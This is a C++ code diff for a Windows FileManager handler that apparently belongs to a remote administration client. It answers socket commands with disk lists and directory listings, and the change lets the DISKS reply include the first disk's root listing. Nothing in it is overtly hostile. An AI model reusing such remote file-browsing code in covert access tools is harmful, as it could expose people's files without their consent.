@@ -48,13 +48,26 @@ void FileManager::sendDirectory(nlohmann::json jsonObject){
 
 
 
-void FileManager::sendDisks(){
+void FileManager::sendDisks(nlohmann::json jsonObject) {
     std::vector<std::string> vectorOfDisks = FileManager::getDisks();
     nlohmann::json json;
     json["RESPONSE"] = "DISKS";
     json["disks"] = vectorOfDisks;
+
+    // Comprueba si debemos incluir la información del directorio del primer disco
+    // y si hay al menos un disco disponible.
+    if (jsonObject.value("sendDirectory", false) && !vectorOfDisks.empty()) {
+        // Obtiene la información del directorio de la raíz del primer disco
+        std::string firstDisk = vectorOfDisks[0];
+        nlohmann::json firstDiskDirectory = readDirectory(firstDisk);
+
+        // Inserta la información del directorio en el json de respuesta
+        json["firstDiskDirectory"] = firstDiskDirectory;
+    }
+
     clientSocket.sendMessage(json);
 }
+
 
 std::vector<std::string> FileManager::getDisks() {
     DWORD dwSize = MAX_PATH;
@@ -167,8 +180,7 @@ FileManager::FileManager(ClientSocket &clientSocket) : Handler(clientSocket) {
         threadGen.runInNewThread(this, &FileManager::moveFilesThread, json);
     };
     actionMap["DISKS"]  = [&](nlohmann::json& json) {
-        std::cout << "hello world" << std::endl;
-        threadGen.runInNewThread(this, &FileManager::sendDisks);
+        threadGen.runInNewThread(this, &FileManager::sendDisks, json);
     };
     actionMap["DIRECTORY"]  = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &FileManager::sendDirectory, json);
